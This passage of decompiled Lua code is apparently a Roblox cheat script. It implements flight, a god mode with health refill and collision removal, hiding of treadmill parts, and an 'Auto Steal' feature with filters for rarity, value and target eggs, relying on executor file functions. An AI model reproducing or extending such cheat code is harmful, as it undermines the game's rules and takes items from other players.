				end

				local ok, result = pcall(function()
					local controller = arg._controller
					return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
				end)

				if ok and type(result) == "boolean" then
					return result
				end

				for _, v20 in ipairs({ "Get", "GetValue" }) do
					local ok2, result2 = pcall(function()
						return arg[v20]
					end)

					if ok2 and type(result2) == "function" then
						local ok3, result3 = pcall(result2, arg)
						if ok3 and type(result3) == "boolean" then
							return result3
						end
					end
				end

				return arg2 == true
			end

			tbl4.Root = function()
				local character = localPlayer.Character
				character = character and character:FindFirstChild("HumanoidRootPart")
				return character and character:IsDescendantOf(workspace) and character or nil
			end

			tbl4.PlacedPoints = function()
				local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
				local tbl26 = {}
				if not placedEggRenders then
					return tbl26
				end
				local str2 = tostring(localPlayer.UserId)

				for _, child in ipairs(placedEggRenders:GetChildren()) do
					if string.find(child.Name, str2, 1, true) then
						local ok, result = pcall(function()
							return child:IsA("Model") and child:GetPivot() or child.CFrame
						end)

						if ok then
							table.insert(tbl26, result.Position)
						end
					end
				end

				return tbl26
			end

			tbl4.OwnPlot = function()
				local plots = workspace:FindFirstChild("Plots")
				if not plots then
					return nil
				end

				for _, child in ipairs(plots:GetChildren()) do
					local plotSign = child:FindFirstChild("PlotSign")
					plotSign = plotSign and plotSign:FindFirstChild("PlayerPlotSign")
					plotSign = plotSign and plotSign:FindFirstChild("Frame")
					plotSign = plotSign and plotSign:FindFirstChild("PlayerName")

					if plotSign and plotSign:IsA("TextLabel") then
						local v20 = string.lower(plotSign.Text)
						if v20 == string.lower(localPlayer.Name) or v20 == string.lower(localPlayer.DisplayName) then
							return child
						end
					end
				end

				return nil
			end

			local function fn13()
				local v20 = tbl4.PlacedPoints()
				if #v20 == 0 then
					return nil
				end
				local vector = Vector3.zero

				for _, v21 in ipairs(v20) do
					vector += v21
				end

				return vector / #v20
			end

			tbl4.PenAnchor = function()
				local v20 = fn13()
				if v20 then
					return v20
				end
				local v21 = tbl4.OwnPlot()
				if not v21 then
					return nil
				end
				local toUpdate = v21:FindFirstChild("ToUpdate")
				local starterPen = toUpdate and toUpdate:FindFirstChild("StarterPen") or v21:FindFirstChild("CenterPoint")
				if not starterPen then
					return nil
				end

				local ok, result = pcall(function()
					return starterPen:IsA("Model") and starterPen:GetPivot() or starterPen.CFrame
				end)

				return ok and result.Position or nil
			end

			tbl4.Plot = function()
				local v20 = tbl4.OwnPlot()
				if v20 then
					return v20
				end
				local plots = workspace:FindFirstChild("Plots")
				local v21 = fn13()
				if not plots or not v21 then
					return nil
				end
				local huge = math.huge
				local v22 = nil

				for _, child in ipairs(plots:GetChildren()) do
					local ok, result, result2 = pcall(function()
						return child:GetBoundingBox()
					end)

					if ok and result and result2 then
						local v23 = result:PointToObjectSpace(v21)
						local n8 = result2.X / 2
						local flag3 = math.abs(v23.X) <= n8
						local flag4

						if flag3 then
							local n9 = result2.Z / 2
							flag4 = math.abs(v23.Z) <= n9
						else
							flag4 = flag3
						end

						if flag4 then
							return child
						end
						local magnitude = (result.Position - v21).Magnitude

						if magnitude < huge then
							v22 = child
							huge = magnitude
						end
					end
				end

				if v22 and huge <= 60 then
					return v22
				end
				return nil
			end

			tbl4.Belt = function()
				local v20 = tbl4.Plot()
				if not v20 then
					return nil
				end
				local treadmillBottom = v20:FindFirstChild("TreadmillBottom")
				if treadmillBottom and treadmillBottom:IsA("BasePart") then
					return treadmillBottom
				end
				local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
				clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v20.Name)

				if clientTreadmillRenders then
					clientTreadmillRenders = clientTreadmillRenders:FindFirstChild("BoundingBoxPart") or clientTreadmillRenders:IsA("Model") and clientTreadmillRenders.PrimaryPart or clientTreadmillRenders:FindFirstChildWhichIsA("BasePart")
				end

				if clientTreadmillRenders then
					return clientTreadmillRenders
				end
				local treadmillUpgrade = v20:FindFirstChild("TreadmillUpgrade")
				return treadmillUpgrade and treadmillUpgrade:FindFirstChildWhichIsA("BasePart") or nil
			end

			tbl4.DistanceTo = function(arg)
				local v20 = tbl4.Root()
				if not v20 or not arg then
					return math.huge
				end
				return (v20.Position - arg).Magnitude
			end

			do
				local tbl26 = {}
				local n8 = 0

				local function fn14()
					local v20 = tbl4.Plot()
					if not v20 then
						return {}
					end
					local tbl27 = {}

					for _, v21 in ipairs({ "TreadmillBottom", "TreadmillUpgrade" }) do
						local v22 = v20:FindFirstChild(v21)

						if v22 then
							if v22:IsA("BasePart") then
								table.insert(tbl27, v22)
							else
								for _, descendant in ipairs(v22:GetDescendants()) do
									if descendant:IsA("BasePart") then
										table.insert(tbl27, descendant)
									end
								end
							end
						end
					end

					local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
					clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v20.Name)

					if clientTreadmillRenders then
						for _, descendant in ipairs(clientTreadmillRenders:GetDescendants()) do
							if descendant:IsA("BasePart") then
								table.insert(tbl27, descendant)
							end
						end
					end

					return tbl27
				end

				local function fn15()
					for _, v20 in ipairs(fn14()) do
						if not tbl26[v20] then
							tbl26[v20] = {
								CFrame = v20.CFrame,
								CanTouch = v20.CanTouch,
								CanCollide = v20.CanCollide,
								Transparency = v20.Transparency,
							}

							pcall(function()
								v20.CanTouch = false
								v20.CanCollide = false
								v20.Transparency = 1
								v20.CFrame = v20.CFrame - Vector3.new(0, 120, 0)
							end)
						end
					end
				end

				local function fn16()
					for k, v20 in pairs(tbl26) do
						if k and k.Parent then
							pcall(function()
								k.CFrame = v20.CFrame
								k.CanTouch = v20.CanTouch
								k.CanCollide = v20.CanCollide
								k.Transparency = v20.Transparency
							end)
						end
					end

					table.clear(tbl26)
				end

				tbl4.HoldBelt = function()
					n8 += 1
					fn15()
				end

				tbl4.ReleaseBelt = function()
					n8 = math.max(0, n8 - 1)

					if n8 == 0 then
						fn16()
					end
				end

				tbl4.BeltHeld = function()
					return n8 > 0
				end

				tbl4.RefreshBeltHide = function()
					if n8 > 0 then
						fn15()
					end
				end

				fn4(function()
					n8 = 0
					fn16()
				end)

				tbl4.LeaveBelt = function()
					local rfTreadmillAskDoff = networking:FindFirstChild("RF/Treadmill/AskDoff")

					if rfTreadmillAskDoff and rfTreadmillAskDoff:IsA("RemoteFunction") then
						pcall(rfTreadmillAskDoff.InvokeServer, rfTreadmillAskDoff)
					end
				end

				tbl4.Treadmill = { Riding = false }

				tbl4.ResetBelt = function()
					n8 = 0
					fn16()
				end

				tbl4.OnBelt = function()
					local v20 = tbl4.Belt()
					if not v20 or tbl26[v20] then
						return false
					end
					local v21 = tbl4.Root()
					if not v21 then
						return false
					end
					local v22 = v20.CFrame:PointToObjectSpace(v21.Position)
					local n9 = v20.Size.X / 2 + 2
					local flag3 = math.abs(v22.X) <= n9

					if flag3 then
						local n10 = v20.Size.Z / 2 + 2
						flag3 = math.abs(v22.Z) <= n10
					end

					return flag3 and v22.Y >= -2 and v22.Y <= v20.Size.Y / 2 + 8
				end
			end

			tbl4.ExitBelt = function()
				tbl4.Treadmill.Riding = false
				tbl4.LeaveBelt()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					pcall(function()
						humanoid.Jump = true
						humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					end)
				end

				task.wait(0.35)
			end

			tbl4.Flying = false
			tbl4.Driving = 0

			tbl4.BeginFlight = function()
				tbl4.Flying = true
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = true

					pcall(function()
						humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
					end)
				end

				return tbl4.Root() ~= nil
			end

			tbl4.SetFlightVelocity = function(assemblyLinearVelocity)
				local v20 = tbl4.Root()

				if v20 then
					v20.AssemblyLinearVelocity = assemblyLinearVelocity
					v20.AssemblyAngularVelocity = Vector3.zero
				end
			end

			tbl4.EndFlight = function()
				tbl4.Flying = false
				local v20 = tbl4.Root()

				if v20 then
					pcall(function()
						v20.AssemblyLinearVelocity = Vector3.zero
						v20.AssemblyAngularVelocity = Vector3.zero
					end)
				end

				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end
			end

			do
				local tbl26 = {
					Enum.HumanoidStateType.FallingDown,
					Enum.HumanoidStateType.Ragdoll,
					Enum.HumanoidStateType.Physics,
					Enum.HumanoidStateType.Seated,
					Enum.HumanoidStateType.PlatformStanding,
				}

				local tbl27 = {}
				local flag3 = false

				tbl4.GodMode = function(arg)
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")
					if not character or not humanoid then
						return
					end

					if arg then
						flag3 = true

						for _, v20 in ipairs(tbl26) do
							pcall(function()
								humanoid:SetStateEnabled(v20, false)
							end)
						end

						pcall(function()
							humanoid.BreakJointsOnDeath = false
						end)

						for _, descendant in ipairs(character:GetDescendants()) do
							if descendant:IsA("BasePart") and tbl27[descendant] == nil then
								tbl27[descendant] = descendant.CanCollide

								pcall(function()
									descendant.CanCollide = false
								end)
							end
						end
					elseif flag3 then
						flag3 = false

						for _, v20 in ipairs(tbl26) do
							pcall(function()
								humanoid:SetStateEnabled(v20, true)
							end)
						end

						for k, v20 in pairs(tbl27) do
							if k and k.Parent then
								pcall(function()
									k.CanCollide = v20
								end)
							end
						end

						table.clear(tbl27)
					end
				end
			end

			tbl4.GodTick = function()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid and humanoid.Health < humanoid.MaxHealth then
					pcall(function()
						humanoid.Health = humanoid.MaxHealth
					end)
				end
			end

			tbl4.StopWalking = function()
				local character = localPlayer.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid and humanoidRootPart then
					pcall(function()
						humanoid:MoveTo(humanoidRootPart.Position)
						humanoid:Move(Vector3.zero, false)
					end)
				end
			end

			local function fn14(arg, arg2, arg3, arg4)
				local n8 = tonumber(arg2) or 6
				local n9 = tonumber(arg3) or 10
				local n10 = 0
				local n11 = 0
				local n12 = 0
				local position

				while n10 < n9 do
					if type(arg4) == "function" and arg4() then
						tbl4.StopWalking()
						return false
					end
					local character = localPlayer.Character
					local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")
					if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
						return false
					end

					if (humanoidRootPart.Position - arg).Magnitude <= n8 then
						tbl4.StopWalking()
						return true
					end

					if position and (humanoidRootPart.Position - position).Magnitude < 1 then
						n11 += 0.2
					else
						n11 = 0
					end

					position = humanoidRootPart.Position
					n12 = math.max(0, n12 - 0.2)

					if n11 >= 0.8 and n12 <= 0 then
						tbl4.LeaveBelt()

						pcall(function()
							humanoid.Jump = true
						end)

						n11 = 0
						n12 = 1.5
					end

					humanoid:MoveTo(arg)
					n10 += task.wait(0.2)
				end

				tbl4.StopWalking()
				return tbl4.DistanceTo(arg) <= n8
			end

			tbl4.WalkTo = function(arg, arg2, arg3, arg4)
				tbl4.Driving = tbl4.Driving + 1
				local ok, result = pcall(fn14, arg, arg2, arg3, arg4)
				tbl4.Driving = math.max(0, tbl4.Driving - 1)
				return ok and result == true
			end

			local tbl26 = {
				Boss = "Fractured",
				GreatBloom = "Spirit Bloom",
				Sakura = "Bloom",
				Monstrous = "Parasite",
			}

			task.spawn(function()
				local mutations = tbl.Mutations

				local ok, result = pcall(function()
					return mutations.All()
				end)

				if ok and type(result) == "table" then
					for k, v20 in pairs(result) do
						local id = type(v20) == "table" and (v20.Id or k) or nil
						local label = type(v20) == "table" and v20.Label or nil

						if id ~= nil and type(label) == "string" and label ~= "" then
							tbl26[tostring(id)] = label
						end
					end
				end
			end)

			fn7 = function(arg)
				return tbl26[tostring(arg)] or tostring(arg)
			end

			local tbl27

			tbl27 = {
				"Forest",
				"Desert",
				"Snow",
				"Lake",
				"Jungle",
				"Volcano",
				"Prehistoric",
				"Cosmic",
				"Abyss Ocean",
				"Cherry Blossom",
				"Light Dark",
				"Titan Temple",
			}

			local tbl28 = {}

			for _, v20 in ipairs(tbl27) do
				tbl28[v20] = true
			end

			task.spawn(function()
				local eggState = tbl.EggState

				local ok, result = pcall(function()
					return eggState.ReadFieldEggs()
				end)

				if ok and type(result) == "table" and type(result.Records) == "table" then
					for _, record in pairs(result.Records) do
						local areaId = type(record) == "table" and record.AreaId or nil

						if type(areaId) == "string" and not tbl28[areaId] then
							tbl28[areaId] = true
							table.insert(tbl27, areaId)
						end
					end
				end
			end)

			tbl13 = { "Any" }
			tbl14 = { Any = 0 }

			do
				local tbl29 = {}
				local directory = tbl.Assets and tbl.Assets.Directory

				if type(directory) == "table" then
					for _, v20 in pairs(directory) do
						local rarity = type(v20) == "table" and v20.Rarity or nil
						local flag3 = type(rarity) == "table"

						if flag3 then
							flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
						end

						flag3 = flag3 or nil

						if flag3 then
							local str2 = tbl29[flag3]

							if not str2 then
								str2 = tostring(rarity.DisplayName or rarity._id or flag3)
							end

							tbl29[flag3] = str2
						end
					end
				end

				if next(tbl29) == nil then
					tbl29 = {
						"Common",
						"Uncommon",
						"Rare",
						"Epic",
						"Legendary",
						"Mythic",
						"Cosmic",
						"Secret",
						"Eternal",
						"Divine",
					}
				end

				local tbl30 = {}

				for k in pairs(tbl29) do
					table.insert(tbl30, k)
				end

				table.sort(tbl30)

				for _, v20 in ipairs(tbl30) do
					table.insert(tbl13, tbl29[v20])
					tbl14[tbl29[v20]] = v20
				end
			end

			tbl5 = { "Best Rarity", "Biggest Weight", "Best Mutation", "Highest Value", "Lowest Value" }
			local tbl29
			tbl29 = {}
			local n8
			n8 = 0
			local tbl30
			tbl30 = {}
			local tbl31
			tbl31 = {}
			local tbl32
			tbl32 = {}
			local tbl33
			tbl33 = {}
			tbl4.Steal.RiftPriority = false
			tbl4.Steal.RiftNeeds = {}
			tbl4.Steal.RiftRequirements = {}
			tbl4.Steal.RiftCurrent = {}

			tbl4.StockWaits = function(arg)
				if type(arg) ~= "table" or not arg.RiftOnly or arg.RiftNow then
					return false
				end
				local mech = tbl4.Mech
				if type(mech) ~= "table" or tbl4.Toggle(mech.Handle, false) ~= true then
					return false
				end
				return mech.Busy == true or workspace:FindFirstChild("ScrambleArenaPortal") ~= nil or localPlayer:GetAttribute("InScrambleArena") == true
			end

			tbl4.Lab = {
				Banners = {},
				Reserved = {},
				SkipOwned = true,
				Stock = {},
				StockEggs = {},
				StockPer = 3,
				Pools = {},
				PoolLists = {},
			}

			tbl4.Lab.Shares = {
				Biohazard = {
					{ "Cyclops Gorilla", 0.431 },
					{ "Red Panda", 0.431 },
					{ "Snowy Owl", 0.399 },
					{ "Salamander", 0.381 },
					{ "Pterodactyl", 0.234 },
					{ "Galaxy Gecko", 0.202 },
					{ "Ankylosaurus", 0.194 },
					{ "Crane", 0.138 },
					{ "Parrotfish", 0.126 },
					{ "Centapede", 0.106 },
					{ "Dodo", 0.104 },
					{ "Swordfish", 0.1 },
					{ "Koi", 0.046 },
					{ "La Vacca Saturno Saturnita", 0.044 },
					{ "Finned Thresher", 0.024 },
					{ "Bronto", 0.019 },
					{ "Triceratops", 0.013 },
					{ "Orca", 0.009 },
				},
				Experimental = {
					{ "Blade Head", 0.342 },
					{ "Red Panda", 0.341 },
					{ "Crab", 0.331 },
					{ "Salamander", 0.327 },
					{ "Snowy Owl", 0.324 },
					{ "Mantis", 0.314 },
					{ "Cyclops Gorilla", 0.178 },
					{ "Galaxy Gecko", 0.161 },
					{ "Crane", 0.135 },
					{ "Kaiju Spider", 0.134 },
					{ "Pterodactyl", 0.119 },
					{ "Dodo", 0.096 },
					{ "Centapede", 0.094 },
					{ "Rhino", 0.034 },
					{ "Koi", 0.032 },
					{ "Ankylosaurus", 0.03 },
					{ "La Vacca Saturno Saturnita", 0.01 },
					{ "Bronto", 0.001 },
					{ "Triceratops", 0.001 },
				},
				UnstableDNA = {
					{ "Toro", 0.236 },
					{ "Lamb", 0.232 },
					{ "Blade Head", 0.228 },
					{ "Imp", 0.223 },
					{ "Crab", 0.22 },
					{ "Moth", 0.219 },
					{ "Demon Hound", 0.217 },
					{ "Peacock", 0.21 },
					{ "Mantis", 0.203 },
					{ "Salamander", 0.165 },
					{ "Dove", 0.104 },
					{ "Flame Sprite", 0.103 },
					{ "Galaxy Gecko", 0.103 },
					{ "Kaiju Spider", 0.102 },
					{ "Red Panda", 0.102 },
					{ "Crane", 0.096 },
					{ "Snowy Owl", 0.088 },
					{ "Centapede", 0.064 },
					{ "Cyclops Gorilla", 0.021 },
					{ "Jellyfish", 0.02 },
					{ "Dark Gargoyle", 0.019 },
					{ "Rhino", 0.018 },
					{ "Koi", 0.009 },
					{ "La Vacca Saturno Saturnita", 0.001 },
				},
			}

			tbl4.Lab.Pickers = {}
			tbl4.Lab.ExtraPath = "ChilliLibrary/SAE_LabEggs.json"

			tbl4.Lab.RefreshPools = function()
				local lab = tbl4.Lab

				local ok, result = pcall(function()
					return require(ReplicatedStorage.Shared.Modules.ScrambleTradeInRecipes)
				end)

				if not ok or type(result) ~= "table" or type(result.Simulate) ~= "function" then
					return
				end
				local HttpService = game:GetService("HttpService")
				local tbl34 = {}

				pcall(function()
					if isfile(lab.ExtraPath) then
						local data = HttpService:JSONDecode(readfile(lab.ExtraPath))

						if type(data) == "table" then
							tbl34 = data
						end
					end
				end)

				local flag3 = false

				for k, share in pairs(lab.Shares) do
					local ok2, result2 = pcall(result.Simulate, k, 4000)

					if ok2 and type(result2) == "table" and type(result2.SlotPicks) == "table" then
						local n9 = math.max(1, tonumber(result2.Runs) or 4000)
						local tbl35 = {}

						for _, slotPick in pairs(result2.SlotPicks) do
							if type(slotPick) == "table" then
								for k2, v20 in pairs(slotPick) do
									local str2 = tostring(k2)
									tbl35[str2] = (tbl35[str2] or 0) + (tonumber(v20) or 0)
								end
							end
						end

						local tbl36 = type(tbl34[k]) == "table" and tbl34[k] or {}
						local tbl37 = {}
						local tbl38 = {}
						local flag4 = false

						for _, v20 in ipairs(share) do
							local v21 = v20[1]
							local v22 = v20[2]

							if (tbl35[v21] or 0) > 0 or v22 < 0.02 then
								tbl37[v21] = true
								table.insert(tbl38, { v21, v22 })
							else
								flag4 = true
							end
						end

						for k2, v20 in pairs(tbl35) do
							if not tbl37[k2] and v20 > 0 then
								local num = tonumber(tbl36[k2])

								if not num then
									num = math.max(0.001, math.floor(v20 / n9 * 1000 + 0.5) / 1000)
									tbl36[k2] = num
									tbl34[k] = tbl36
									flag3 = true
								end

								table.insert(tbl38, { k2, num })
								flag4 = true
							end
						end

						if flag4 then
							table.sort(tbl38, function(arg, arg2)
								if arg[2] ~= arg2[2] then
									return arg[2] > arg2[2]
								end
								return arg[1] < arg2[1]
							end)

							lab.Shares[k] = tbl38
							lab.Pools[k] = nil
							lab.PoolLists[k] = nil
							local v20 = lab.Pickers[k]

							if v20 and v20.Handle and type(v20.Handle.SetOptions) == "function" and type(lab.LabelsFor) == "function" then
								local v21, v22 = lab.LabelsFor(k)

								if #v21 > 0 then
									v20.CategoryOf = v22
									pcall(v20.Handle.SetOptions, v20.Handle, v21, nil, true)
								end
							end
						end
					end

					task.wait()
				end

				task.delay(0.3, function()
					pcall(tbl4.Lab.FixPickers)
				end)

				if flag3 and type(writefile) == "function" then
					pcall(function()
						if type(isfolder) == "function" and type(makefolder) == "function" and not isfolder("ChilliLibrary") then
							makefolder("ChilliLibrary")
						end

						writefile(lab.ExtraPath, HttpService:JSONEncode(tbl34))
					end)
				end
			end

			tbl4.Lab.FixPickers = function()
				local lab = tbl4.Lab
				if not tbl4.Steal.RiftPriority or type(lab.LabelsFor) ~= "function" then
					return
				end

				for k, picker in pairs(lab.Pickers) do
					local handle = picker.Handle
					local value = type(handle) == "table" and rawget(handle, "Instance") or nil

					if typeof(value) == "Instance" and value.AbsoluteSize.Y <= 2 and type(handle.SetOptions) == "function" then
						local v20, v21 = lab.LabelsFor(k)

						if #v20 > 0 then
							picker.CategoryOf = v21
							pcall(handle.SetOptions, handle, v20, nil, false)
						end
					end
				end
			end

			tbl4.Lab.PoolOf = function(arg)
				local lab = tbl4.Lab
				local v20 = lab.Pools[arg]
				if v20 then
					return v20
				end
				local tbl34 = {}
				local tbl35 = {}
				local v21 = ipairs
				local tbl36 = lab.Shares[tostring(arg)] or {}

				for _, v22 in v21(tbl36) do
					local v23 = v22[1]
					local v24 = v22[2]

					if v24 >= 0.05 then
						tbl34[v23] = true
					end

					table.insert(tbl35, { Category = v23, Share = v24 })
				end

				lab.Pools[arg] = tbl34
				lab.PoolLists[arg] = tbl35
				return tbl34
			end

			tbl4.Lab.IsLabPet = function(arg)
				local lab = tbl4.Lab

				if not lab.PetSet then
					local petSet = {}
					local data = lab.Data

					if type(data) == "table" and type(data.Banners) == "table" then
						for _, banner in ipairs(data.Banners) do
							local v20 = ipairs
							local pets = type(banner) == "table" and type(banner.Pets) == "table" and banner.Pets or {}

							for _, pet in v20(pets) do
								if type(pet) == "table" and pet.AssetId ~= nil then
									petSet[tostring(pet.AssetId)] = true
								end
							end
						end
					end

					if next(petSet) == nil then
						return false
					end
					lab.PetSet = petSet
				end

				return lab.PetSet[tostring(arg)] == true
			end

			tbl4.Lab.StockActive = function()
				return next(tbl4.Lab.Stock) ~= nil
			end

			tbl4.Lab.StockTargets = function()
				local lab = tbl4.Lab
				local tbl34 = {}
				if not tbl4.Steal.RiftPriority or not lab.StockActive() then
					return tbl34
				end

				for k in pairs(lab.Stock) do
					local v20 = lab.StockEggs[k]
					local v21 = pairs
					local tbl35 = type(v20) == "table" and v20 or {}

					for k2 in v21(tbl35) do
						tbl34[k2] = lab.StockPer
					end
				end

				return tbl34
			end

			tbl4.Lab.Data = fn2(function()
				return ReplicatedStorage.Data.ScrambleTradeIn
			end)

			tbl4.Lab.Fallback = {
				{ Id = "Biohazard", Name = "Biohazard Pets" },
				{ Id = "Experimental", Name = "Experimental Pets" },
				{ Id = "UnstableDNA", Name = "Unstable DNA" },
			}

			tbl4.Lab.BannerList = function()
				local data = tbl4.Lab.Data
				local tbl34 = {}

				if type(data) == "table" and type(data.Banners) == "table" then
					for _, banner in ipairs(data.Banners) do
						if type(banner) == "table" and banner.Id ~= nil then
							table.insert(tbl34, { Id = tostring(banner.Id), Name = tostring(banner.DisplayName or banner.Id) })
						end
					end
				end

				if #tbl34 == 0 then
					return tbl4.Lab.Fallback
				end
				return tbl34
			end

			tbl4.Lab.BannerName = function(arg)
				for _, v20 in ipairs(tbl4.Lab.BannerList()) do
					if v20.Id == tostring(arg) then
						return v20.Name
					end
				end

				return tostring(arg)
			end

			tbl4.Lab.BannerOk = function(arg)
				if next(tbl4.Lab.Banners) == nil then
					return true
				end
				return arg ~= nil and tbl4.Lab.Banners[tostring(arg)] == true
			end

			tbl4.Lab.PickedText = function()
				local tbl34 = {}

				for _, v20 in ipairs(tbl4.Lab.BannerList()) do
					if tbl4.Lab.Banners[v20.Id] then
						table.insert(tbl34, v20.Name)
					end
				end

				return table.concat(tbl34, " or ")
			end

			local flag3
			flag3 = false
			local tbl34
			tbl34 = {}
			local n9
			n9 = 0
			v4 = tbl5[4]
			local n10
			n10 = 27.4
			n7 = 400
			local fn15
			fn15 = nil

			v5 = v19:CreateToggle({
				Name = "Auto Steal",
				Default = false,
				Callback = function()
					if fn15 then
						fn15()
					end
				end,
			})

			for _, v20 in ipairs(tbl27) do
				tbl29[v20] = true
			end

			fn6(v19:CreateMultiDropdown({
				Name = "Target Areas",
				Options = tbl27,
				Default = tbl27,
				Callback = function(arg)
					local tbl35 = {}

					if type(arg) == "table" then
						for k, v20 in pairs(arg) do
							if v20 == true and type(k) == "string" then
								tbl35[k] = true
							elseif type(v20) == "string" then
								tbl35[v20] = true
							end
						end
					end

					if next(tbl35) == nil then
						for _, v20 in ipairs(tbl27) do
							tbl35[v20] = true
						end
					end

					tbl29 = tbl35
				end,
			}))

			v19:CreateDropdown({
				Name = "Min Rarity",
				Note = "Steal eggs of the chosen rarity and every rarity above it",
				Options = tbl13,
				Default = tbl13[1],
				Callback = function(arg)
					n8 = tbl14[arg] or 0
				end,
			})

			fn5(v19, {
				Name = "Min Steal Value",
				Note = "Skip eggs worth less than this. Drag or type 250k, 50m, 1.5b",
				Legacy = "Min Value To Steal",
				SectionName = "Auto Steal",
				OnRaw = function(arg)
					n9 = arg
				end,
			})

			do
				local tbl35 = {}
				local tbl36 = {}
				local directory = tbl.Assets and tbl.Assets.Directory
				local tbl37 = {}

				if type(directory) == "table" then
					for k, v20 in pairs(directory) do
						local rarity = type(v20) == "table" and v20.Rarity or nil
						local flag4 = type(rarity) == "table"

						if flag4 then
							flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
						end

						flag4 = flag4 or nil

						if flag4 then
							table.insert(tbl37, {
								Category = tostring(k),
								Name = tostring(v20.DisplayName or k),
								Rarity = flag4,
								RarityName = tostring(rarity.DisplayName or rarity._id or flag4),
							})
						end
					end
				end

				table.sort(tbl37, function(arg, arg2)
					if arg.Rarity ~= arg2.Rarity then
						return arg.Rarity > arg2.Rarity
					end
					return arg.Name < arg2.Name
				end)

				for _, v20 in ipairs(tbl37) do
					local str2 = string.format("%s [%s]", v20.Name, v20.RarityName)

					if tbl36[str2] then
						str2 = string.format("%s [%s] (%s)", v20.Name, v20.RarityName, v20.Category)
					end

					table.insert(tbl35, str2)
					tbl36[str2] = v20.Category
				end

				fn6(v19:CreateMultiDropdown({
					Name = "Target Specific Eggs",
					Note = "Only steal these eggs (empty = all)",
					Options = tbl35,
					Default = {},
					Callback = function(arg)
						local tbl38 = {}

						if type(arg) == "table" then
							for k, v20 in pairs(arg) do
								k = v20 == true and type(k) == "string" and k or type(v20) == "string" and v20 or nil

								if k and tbl36[k] then
									tbl38[tbl36[k]] = true
								end
							end
						end

						tbl30 = tbl38
					end,
				}))
			end

			do
				local n11 = 30
				local v20 = nil
				local flag4 = false
				local n12 = 0

				local function fn16()
					local tbl35 = {}
					local save2 = tbl.Save

					if type(save2) == "table" and type(save2.Get) == "function" then
						local ok, result = pcall(save2.Get)

						if ok and type(result) == "table" then
							local tbl36 = {}
							local eggState = tbl.EggState

							if type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function" then
								local ok2, result2 = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

								if ok2 and type(result2) == "table" then
									for k, v21 in pairs(result2) do
										if type(v21) == "table" and v21.Placement ~= nil then
											tbl36[k] = true
										end
									end
								end
							end

							local v21 = pairs
							local eggInventory = result.EggInventory or {}

							for k, v22 in v21(eggInventory) do
								if type(v22) == "table" and v22.AssetCategory ~= nil and not tbl36[k] then
									local str2 = tostring(v22.AssetCategory)
									tbl35[str2] = (tbl35[str2] or 0) + 1
								end
							end
						end
					end

					return tbl35
				end

				local function fn17()
					local lab = tbl4.Lab
					local tbl35 = {}
					tbl4.Steal.RiftCurrent = {}
					local tbl36 = nil

					if lab.StockActive() then
						tbl36 = fn16()

						for k, v21 in pairs(lab.StockTargets()) do
							if (tbl36[k] or 0) < v21 then
								tbl35[k] = true
							end
						end

						local riftBanner = tbl4.Steal.RiftBanner
						if riftBanner == nil or not lab.Stock[riftBanner] then
							return tbl35
						end
					end

					local tbl37 = {}

					for _, riftRequirement in ipairs(tbl4.Steal.RiftRequirements) do
						tbl37[riftRequirement] = (tbl37[riftRequirement] or 0) + 1
					end

					if next(tbl37) == nil then
						return tbl35
					end

					if lab.SkipOwned then
						tbl36 = tbl36 or fn16()
					else
						tbl36 = {}
					end

					local riftCurrent = {}

					for k, v21 in pairs(tbl37) do
						if (tbl36[k] or 0) < v21 then
							tbl35[k] = true
							riftCurrent[k] = true
						end
					end

					tbl4.Steal.RiftCurrent = riftCurrent
					return tbl35
				end

				local function fn18()
					local rfScrambleTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")
					local isRemoteFunction = rfScrambleTradeInAskState and rfScrambleTradeInAskState:IsA("RemoteFunction")
					local flag5 = false
					local result = nil

					if isRemoteFunction then
						flag5, result = pcall(rfScrambleTradeInAskState.InvokeServer, rfScrambleTradeInAskState)
					end

					if not flag5 or type(result) ~= "table" or type(result.Requirements) ~= "table" then
						if tbl4.Lab.StockActive() then
							tbl4.Steal.RiftNeeds = fn17()
						end

						return
					end

					tbl4.Steal.RiftBanner = result.BannerId ~= nil and tostring(result.BannerId) or nil
					local riftRequirements = {}

					if result.Unlocked ~= false and tbl4.Lab.BannerOk(result.BannerId) then
						for _, requirement in ipairs(result.Requirements) do
							table.insert(riftRequirements, tostring(requirement))
						end
					end

					tbl4.Steal.RiftRequirements = riftRequirements
					tbl4.Steal.RiftNeeds = fn17()
				end

				tbl3.Add(function()
					if not tbl4.Steal.RiftPriority or flag4 or os.clock() < n12 then
						return false
					end
					flag4 = true
					n12 = os.clock() + n11

					task.spawn(function()
						pcall(fn18)
						flag4 = false
					end)

					return false
				end)

				local function recount()
					if not tbl4.Steal.RiftPriority then
						return
					end
					local riftNeeds = tbl4.Steal.RiftNeeds
					local v21 = fn17()
					local flag5 = false

					for k in pairs(riftNeeds) do
						if not v21[k] then
							flag5 = true
						end
					end

					for k in pairs(v21) do
						if not riftNeeds[k] then
							flag5 = true
						end
					end

					tbl4.Steal.RiftNeeds = v21

					if flag5 then
						tbl3.Wake()
					end
				end

				tbl4.Lab.Recount = recount
				local save2 = tbl.Save

